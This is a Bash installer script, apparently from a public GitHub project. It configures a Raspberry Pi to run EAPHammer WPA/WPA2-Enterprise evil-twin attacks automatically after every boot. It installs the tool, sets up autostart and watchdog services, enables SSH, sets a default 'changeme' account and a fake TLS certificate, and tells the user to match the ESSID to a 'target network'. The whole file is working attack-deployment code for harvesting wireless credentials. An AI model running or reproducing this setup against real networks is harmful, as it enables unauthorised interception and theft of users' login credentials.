#!/usr/bin/env bash

# EAPgrade is a simple Bash script that upgrades your fresh Raspbian installation so that it launches WPA/WPA2-MGT fake AP attacks automatically after booting
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/EAPgrade
# style guide - https://google.github.io/styleguide/shellguide.html

# TODO
#
# use colored output

readonly EAPGRADE_DIR="$(realpath "$(dirname "${0}")")"
readonly EAPHAMMER_DIR='/opt/eaphammer'

# permissions check
if [ "${USER}" != 'root' ]
then
    echo 'ERROR - root identity needed in order to deal with services' >&2
    exit 1
else
    echo 'INFO - root identity confirmed, proceeding' >&2
fi

# github access check
if ! curl 'github.com' --max-time '4' &> '/dev/null'
then
    echo 'ERROR - internet access and name resolution needed in order to clone EAPHammer' >&2
    exit 1
else
    echo 'INFO - internet access confirmed, proceeding' >&2
fi

# EAPHammer git clone
echo 'INFO - cloning EAPHammer to "'"${EAPHAMMER_DIR}"'/"' >&2
cd '/opt/'
git clone 'https://github.com/s0lst1c3/eaphammer.git' &> '/dev/null'
cd "${EAPHAMMER_DIR}/"

# file movement
echo 'INFO - moving files to "'"${EAPHAMMER_DIR}"'/"' >&2
cp --force "${EAPGRADE_DIR}/eaphammer.sh" "${EAPGRADE_DIR}/eaphammer.service" "${EAPGRADE_DIR}/eaphammer_watchdog.sh" "${EAPGRADE_DIR}/eaphammer_watchdog.service" "${EAPHAMMER_DIR}/"

# EAPHammer installation
echo 'INFO - updating, installing dependencies and generating DH parameters. This is going to take a while, you can check the progress with "tail -f /tmp/EAPgrade.log" if you wish :)' >&2
echo -e 'y\ny' | ./raspbian-setup &> '/tmp/EAPgrade.log'

# services setup
echo 'INFO - disabling wpa_supplicant.service and dnsmasq.service so that they don'"'"'t interfere' >&2
systemctl --quiet disable 'dnsmasq.service'
systemctl --quiet disable 'wpa_supplicant.service'
cp --force '/etc/dhcpcd.conf' '/etc/dhcpcd.conf.backup'
echo 'nohook wpa_supplicant' >> '/etc/dhcpcd.conf'

echo 'INFO - enabling eaphammer.service so that EAPHammer launches automatically after booting' >&2
cp --force "${EAPHAMMER_DIR}/eaphammer.service" '/lib/systemd/system/eaphammer.service'
systemctl --quiet enable 'eaphammer.service'

echo 'INFO - enabling eaphammer_watchdog.service in order to restart EAPHammer when unstable' >&2
cp --force "${EAPHAMMER_DIR}/eaphammer_watchdog.service" '/lib/systemd/system/eaphammer_watchdog.service'
systemctl --quiet enable 'eaphammer_watchdog.service'

echo 'INFO - enabling ssh.service in order to administrate your Raspbian without needing to plug in keyboard and display' >&2
systemctl --quiet enable 'ssh.service'

# EAPHammer users configuration
echo 'INFO - setting up user "EAPgrade" to access the fake AP network with password "changeme"' >&2
cp --force "${EAPHAMMER_DIR}/db/phase2.accounts" "${EAPHAMMER_DIR}/db/phase2.accounts.backup"
echo -e '"EAPgrade"\tGTC\t"changeme"\t[2]' > "${EAPHAMMER_DIR}/db/phase2.accounts"

# EAPHammer certs generation
echo 'INFO - generating fake TLS certificate to use with EAPHammer' >&2
python3 eaphammer --bootstrap --cn 'hotspot.eapgrade.org' --country 'ES' --state 'Madrid' --locale 'Madrid' --org 'eapgrade' --org-unit 'IT' --email 'administrator@eapgrade.org' &> '/dev/null'

# final steps
chmod +x "${EAPHAMMER_DIR}/eaphammer.sh"
chmod +x "${EAPHAMMER_DIR}/eaphammer_watchdog.sh"
echo 'INFO - done! Now the WPA/WPA2-MGT fake AP attack should launch automatically after booting, raw logs will be located at "'"${EAPHAMMER_DIR}"'/logs/hostapd-eaphammer.raw". Next steps:' >&2
echo '       Modify user and password to access the fake AP network at "'"${EAPHAMMER_DIR}"'/db/phase2.accounts"' >&2
echo '       Modify the ESSID at "'"${EAPHAMMER_DIR}"'/eaphammer.sh" so that it matches your target network' >&2
echo '       Delete "'"${EAPHAMMER_DIR}"'/certs/server/*", "'"${EAPHAMMER_DIR}"'/certs/ca/*" and "'"${EAPHAMMER_DIR}"'/certs/active/*"; and generate your own targeted certs by "python3 '"${EAPHAMMER_DIR}"'/eaphammer --cert-wizard" (may need to install some Python 3 modules)' >&2

exit 0
